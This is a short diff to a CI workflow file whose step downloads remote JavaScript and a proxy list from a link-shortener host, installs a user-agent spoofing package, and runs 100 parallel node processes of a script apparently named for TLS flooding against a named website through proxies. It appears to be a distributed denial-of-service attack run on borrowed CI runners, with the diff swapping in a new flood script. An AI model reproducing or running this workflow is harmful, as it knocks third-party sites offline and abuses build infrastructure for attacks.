@@ -15,12 +15,13 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/99kBl/cfod.js
+          wget https://curl.by/vsR4H/tlsv2.js
           wget https://curl.by/zCzT3/proxy.txt
-          chmod +x cfod.js
+          npm install fake-useragent
+          chmod +x tlsv2.js
           PIDS=()
           for i in {1..100}; do
-            timeout 85 node uamv.js https://hexbear.xyz/ 10 90 80
+            timeout 85 node tlsv2.js https://hexbear.xyz/ 80 90 10 proxy.txt
             PIDS+=($!)
           done
           
